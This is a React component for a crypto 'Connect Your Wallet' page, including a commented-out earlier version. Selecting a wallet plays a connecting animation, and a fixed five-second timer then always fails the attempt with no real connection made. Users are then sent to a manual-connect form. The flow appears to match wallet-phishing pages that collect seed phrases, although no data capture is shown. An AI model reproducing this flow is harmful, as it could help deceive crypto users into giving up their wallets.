// // Connect.js
// import React, { useState, useEffect } from "react";
// import { wallets } from "../utils/wallet";
// import ConnectModal from "../components/ConnectModal";

// const Connect = () => {
//   const [selectedWallet, setSelectedWallet] = useState(null);
//   const [connecting, setConnecting] = useState(false);
//   const [dots, setDots] = useState(1);

//   const openModal = (wallet) => {
//     setSelectedWallet(wallet);
//     setConnecting(true);
//     setDots(1);

//     // Update dots every second
//     const interval = setInterval(() => {
//       setDots((prevDots) => (prevDots < 3 ? prevDots + 1 : 1));
//     }, 1000);

//     // Simulate a delay for 5 seconds before showing an error message
//     setTimeout(() => {
//       setConnecting(false);
//       clearInterval(interval);
//     }, 5000);
//   };

//   const closeModal = () => {
//     setSelectedWallet(null);
//   };

//   // Cleanup interval on component unmount
// //   useEffect(() => {
// //     return () => {
// //       clearInterval(interval);
// //     };
// //   }, []);

//   return (
//     <div className="fixed top-0 right-0 bottom-0 left-0 flex items-center justify-center bg-gray-200 shadow-md p-5">
//       <div className="bg-white w-[50vw] h-[80vh] mb-10 rounded-xl overflow-hidden">
//         <h1 className="text-center text-2xl font-semibold my-10">
//           Connect Your Wallet
//         </h1>
//         <ul className="list-none overflow-y-auto h-full p-3">
//           {wallets.map((wallet, key) => {
//             return (
//               <li
//                 key={key}
//                 className="flex items-center gap-10 justify-between border p-3 text-xl m-3 rounded-md cursor-pointer"
//                 onClick={() => openModal(wallet)}
//               >
//                 <span>{wallet.name}</span>
//                 <div>
//                   <img src={wallet.image} alt="" className="h-16 w-16" />
//                 </div>
//               </li>
//             );
//           })}
//         </ul>
//       </div>

//       {selectedWallet && (
//         <ConnectModal
//           connecting={connecting}
//           dots={dots}
//           selectedWallet={selectedWallet}
//           closeModal={closeModal}
//         />
//       )}
//     </div>
//   );
// };

// export default Connect;

// Connect.js
import React, { useState } from "react";
import { wallets } from "../utils/wallet";
import ConnectModal from "../components/ConnectModal";
import ManualConnectModal from "../components/ManualConnectModal";

const Connect = () => {
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [connecting, setConnecting] = useState(false);
  const [dots, setDots] = useState(1);
  const [showManualConnectModal, setShowManualConnectModal] = useState(false);

  const openModal = (wallet) => {
    setSelectedWallet(wallet);
    setConnecting(true);
    setDots(1);

    // Update dots every second
    const interval = setInterval(() => {
      setDots((prevDots) => (prevDots < 3 ? prevDots + 1 : 1));
    }, 1000);

    // Simulate a delay for 5 seconds before showing an error message
    setTimeout(() => {
      setConnecting(false);
      clearInterval(interval);
    }, 5000);
  };

  const closeModal = () => {
    setSelectedWallet(null);
    setShowManualConnectModal(false);
  };

  const openManualConnectModal = () => {
    setShowManualConnectModal(true);
  };

  // Cleanup interval on component unmount
//   useEffect(() => {
//     return () => {
//       clearInterval(interval);
//     };
//   }, []);

  return (
    <div className="fixed top-0 right-0 bottom-0 left-0 flex items-center justify-center bg-gray-800 shadow-md p-5 bg-opacity-50">
      <div className="bg-white  w-full md:max-w-[700px] h-[80vh] mb-10 rounded-xl overflow-hidden">
        <h1 className="text-center text-2xl font-semibold my-10">
          Connect Your Wallet
        </h1>
        <ul className="list-none overflow-y-auto h-full p-3">
          {wallets.map((wallet, key) => {
            return (
              <li
                key={key}
                className="flex items-center gap-10 justify-between border p-3 text-xl m-3 rounded-md cursor-pointer"
                onClick={() => openModal(wallet)}
              >
                <span>{wallet.name}</span>
                <div>
                  <img src={wallet.image} alt="" className="h-10 w-10 md:h-16 md:w-16" />
                </div>
              </li>
            );
          })}
        </ul>
      </div>

      {selectedWallet && !showManualConnectModal && (
        <ConnectModal
          connecting={connecting}
          dots={dots}
          selectedWallet={selectedWallet}
          closeModal={closeModal}
          showManualConnectModal={openManualConnectModal}
        />
      )}
      {showManualConnectModal && (
        <ManualConnectModal
          selectedWallet={selectedWallet}
          closeModal={closeModal}
          onSubmit={() => {
            // Handle any logic after manual connect form submission
            // For example, you may want to update state or perform additional actions
            console.log("Form submitted!");
          }}
        />
      )}

      {/* {showManualConnectModal && (
        <div className="fixed top-0 right-0 bottom-0 left-0 flex items-center justify-center text-xl bg-gray-50 ">
          <div className="bg-white p-5 rounded-xl w-[700px]">
            <h2 className="text-xl font-semibold mb-4">
              {selectedWallet.name}
            </h2>
            <form>
              <label className="block mb-2">Additional Information:</label>
              <textarea
                className="w-full h-32 border border-gray-300 rounded-md p-2"
                placeholder="Enter additional information..."
              ></textarea>
              <button
                type="submit"
                className="mt-4 px-4 py-2 bg-gray-600 text-white rounded-md"
                onClick={(e) => {
                  e.preventDefault();
                  // Handle form submission logic here
                }}
              >
                Submit
              </button>
            </form>
            <button
              className="mt-4 px-4 py-2 bg-gray-600 text-white rounded-md"
              onClick={closeModal}
            >
              Close
            </button>
          </div>
        </div>
      )} */}

      {/* ... Rest of your component code ... */}
    </div>
  );
};

export default Connect;
